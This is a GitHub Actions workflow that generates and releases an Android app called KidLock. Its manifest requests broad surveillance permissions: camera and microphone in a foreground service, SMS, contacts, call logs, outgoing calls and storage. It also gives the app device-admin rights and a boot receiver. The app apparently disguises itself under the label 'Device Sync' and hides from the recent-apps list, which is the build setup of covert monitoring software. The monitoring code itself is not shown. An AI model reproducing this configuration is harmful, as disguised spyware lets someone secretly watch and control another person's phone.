name: Build & Release APK

on:
  push:
    branches:
      - main
      - master

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: 'gradle'

      - name: Setup Gradle wrapper
        run: |
          mkdir -p app/gradle/wrapper
          curl -o app/gradlew https://raw.githubusercontent.com/gradle/gradle/v8.4.0/gradlew
          curl -o app/gradle/wrapper/gradle-wrapper.jar https://raw.githubusercontent.com/gradle/gradle/v8.4.0/gradle/wrapper/gradle-wrapper.jar
          chmod +x app/gradlew
          printf 'distributionBase=GRADLE_USER_HOME\ndistributionPath=wrapper/dists\ndistributionUrl=https\\://services.gradle.org/distributions/gradle-8.4-bin.zip\nzipStoreBase=GRADLE_USER_HOME\nzipStorePath=wrapper/dists\n' > app/gradle/wrapper/gradle-wrapper.properties

      - name: Write Gradle config files
        run: |
          printf 'android.useAndroidX=true\nandroid.enableJetifier=true\norg.gradle.jvmargs=-Xmx2048m\norg.gradle.caching=true\n' > app/gradle.properties
          printf 'rootProject.name = "kidlock"\ninclude ":app"\n' > app/settings.gradle
          printf 'buildscript {\n    repositories {\n        google()\n        mavenCentral()\n    }\n    dependencies {\n        classpath "com.android.tools.build:gradle:8.2.0"\n        classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:1.9.22"\n    }\n}\nallprojects {\n    repositories {\n        google()\n        mavenCentral()\n    }\n}\n' > app/build.gradle

      - name: Create app module
        run: |
          mkdir -p app/app/src/main/kotlin/com/kidlock
          mkdir -p app/app/src/main/res/xml
          mkdir -p app/app/src/main/res/layout
          printf 'apply plugin: "com.android.application"\napply plugin: "kotlin-android"\nandroid {\n    namespace "com.kidlock"\n    compileSdk 34\n    defaultConfig {\n        applicationId "com.kidlock"\n        minSdk 26\n        targetSdk 34\n        versionCode 1\n        versionName "1.0"\n    }\n    buildTypes { release { minifyEnabled false } }\n    compileOptions {\n        sourceCompatibility JavaVersion.VERSION_1_8\n        targetCompatibility JavaVersion.VERSION_1_8\n    }\n    kotlinOptions { jvmTarget = "1.8" }\n}\ndependencies {\n    implementation "androidx.core:core-ktx:1.12.0"\n    implementation "androidx.appcompat:appcompat:1.6.1"\n}\n' > app/app/build.gradle

      - name: Write AndroidManifest
        run: |
          python3 -c "
          c = open('app/app/src/main/AndroidManifest.xml','w')
          c.write('<?xml version=\"1.0\" encoding=\"utf-8\"?>\n')
          c.write('<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\">\n')
          c.write('    <uses-permission android:name=\"android.permission.CAMERA\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.INTERNET\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.FOREGROUND_SERVICE\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.FOREGROUND_SERVICE_CAMERA\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.FOREGROUND_SERVICE_MICROPHONE\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.WAKE_LOCK\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.PACKAGE_USAGE_STATS\" tools:ignore=\"ProtectedPermissions\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.READ_SMS\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.READ_CONTACTS\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.READ_CALL_LOG\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.PROCESS_OUTGOING_CALLS\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n')
          c.write('    <uses-permission android:name=\"android.permission.MANAGE_EXTERNAL_STORAGE\" tools:ignore=\"ScopedStorage\"/>\n')
          c.write('    <application android:allowBackup=\"false\" android:label=\"Device Sync\" android:theme=\"@style/Theme.AppCompat.NoActionBar\">\n')
          c.write('        <activity android:name=\".MainActivity\" android:exported=\"true\" android:excludeFromRecents=\"true\">\n')
          c.write('            <intent-filter>\n')
          c.write('                <action android:name=\"android.intent.action.MAIN\"/>\n')
          c.write('                <category android:name=\"android.intent.category.LAUNCHER\"/>\n')
          c.write('            </intent-filter>\n')
          c.write('        </activity>\n')
          c.write('        <activity android:name=\".LockActivity\" android:exported=\"false\" android:showOnLockScreen=\"true\" android:turnScreenOn=\"true\" android:excludeFromRecents=\"true\" android:launchMode=\"singleTask\" android:theme=\"@style/Theme.AppCompat.NoActionBar\"/>\n')
          c.write('        <service android:name=\".ChildService\" android:exported=\"false\" android:foregroundServiceType=\"camera|microphone\"/>\n')
          c.write('        <receiver android:name=\".AdminReceiver\" android:exported=\"true\" android:permission=\"android.permission.BIND_DEVICE_ADMIN\">\n')
          c.write('            <meta-data android:name=\"android.app.device_admin\" android:resource=\"@xml/device_admin\"/>\n')
          c.write('            <intent-filter><action android:name=\"android.app.action.DEVICE_ADMIN_ENABLED\"/></intent-filter>\n')
          c.write('        </receiver>\n')
          c.write('        <receiver android:name=\".BootReceiver\" android:exported=\"true\">\n')
          c.write('            <intent-filter><action android:name=\"android.intent.action.BOOT_COMPLETED\"/></intent-filter>\n')
          c.write('        </receiver>\n')
          c.write('    </application>\n')
          c.write('</manifest>\n')
          c.close()
          "

      - name: Write res files
        run: |
          printf '<?xml version="1.0" encoding="utf-8"?>\n<device-admin>\n    <uses-policies>\n        <lock-screen/>\n        <watch-login/>\n    </uses-policies>\n</device-admin>\n' > app/app/src/main/res/xml/device_admin.xml
          printf '<?xml version="1.0" encoding="utf-8"?>\n<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"\n    android:layout_width="match_parent" android:layout_height="match_parent" android:background="#000000">\n    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"\n        android:layout_centerInParent="true" android:text="Phone is locked"\n        android:textColor="#FFFFFF" android:textSize="24sp"/>\n</RelativeLayout>\n' > app/app/src/main/res/layout/activity_lock.xml

      - name: Copy Kotlin files
        run: |
          find . -name "*.kt" -not -path "*/build/*" -not -path "*/.git/*" -exec cp {} app/app/src/main/kotlin/com/kidlock/ \;
          ls app/app/src/main/kotlin/com/kidlock/

      - name: Build Debug APK
        run: cd app && ./gradlew assembleDebug --no-daemon
        env:
          ANDROID_HOME: /usr/local/lib/android/sdk

      - name: Verify APK exists
        run: ls -la app/app/build/outputs/apk/debug/

      - name: Generate version tag
        id: version
        run: echo "tag=v$(date +'%Y%m%d%H%M%S')" >> $GITHUB_OUTPUT

      - name: Upload to GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ steps.version.outputs.tag }}
          name: KidLock ${{ steps.version.outputs.tag }}
          files: app/app/build/outputs/apk/debug/app-debug.apk
          body: Auto release on push to main
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
